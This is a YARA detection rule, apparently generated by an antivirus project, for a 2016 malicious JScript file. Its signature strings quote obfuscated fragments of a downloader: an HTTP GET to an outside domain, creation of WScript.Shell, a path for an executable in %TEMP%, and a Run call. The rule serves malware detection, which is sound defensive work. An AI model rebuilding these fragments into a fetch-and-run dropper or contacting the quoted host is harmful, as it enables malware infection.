rule sig_20160401_f028517552c9d4f7349a36818f382edb {
  meta:
    description = "datamaliciousorder - file 20160401_f028517552c9d4f7349a36818f382edb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6a55ae55a33c32689ff7e9289b16379ae05f3de0e0a7a71a7b80d392c76a7a39"

  strings:
    $s1  = "VqbYs[IiLst](\"G\" + \"ET\", \"http://xn--as-wqa.org.pl/s0olau\", false);" fullword ascii
    $s2  = "function RyzNrw(FauPp, XtJqw){SaiNj = SaiNj * 1; return FauPp - XtJqw;};" fullword ascii
    $s3  = "var IfZn = function IqEr() {return WScript[UuzCxh](\"WScript\"+\".Shell\");}(), HzUbh = 11;" fullword ascii
    $s4  = "if (VqbYs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ClmQhr() {return IfZn[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ZuD2IlKCz2JsLHa.ex\" + \"e\";};" fullword ascii
    $s6  = "function CfCbt(){return JupZhd + \"\";};" fullword ascii
    $s7  = "function QgCc() {return ((BjPnk == true) && (BjPnk == ByCm)) ? 1 : SaiNj;};" fullword ascii
    $s8  = "var ByCm = false;" fullword ascii
    $s9  = "var SiZym = false;" fullword ascii
    $s10 = "ByCm = true; " fullword ascii
    $s11 = "function MjVmt(){return 23;};" fullword ascii
    $s12 = "return RyzNrw(IohKke, XjTdq);" fullword ascii
    $s13 = "function WmdAe(QiJre){IfZn[\"R\"+\"un\"](QiJre, SaiNj, SaiNj);};" fullword ascii
    $s14 = "function ZupYbc(){return UuzCxh;};" fullword ascii
    $s15 = "}while (WdfHc);" fullword ascii
    $s16 = "function PzaYqi(IiYwl) {var BkYmi = (1, 2, 3, 4, 5, IiYwl); return BkYmi;};" fullword ascii
    $s17 = "var BjPnk = false;" fullword ascii
    $s18 = "function IlZkm()" fullword ascii
    $s19 = "var IlAhe = new this[\"Date\"]();" fullword ascii
    $s20 = "BjPnk = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}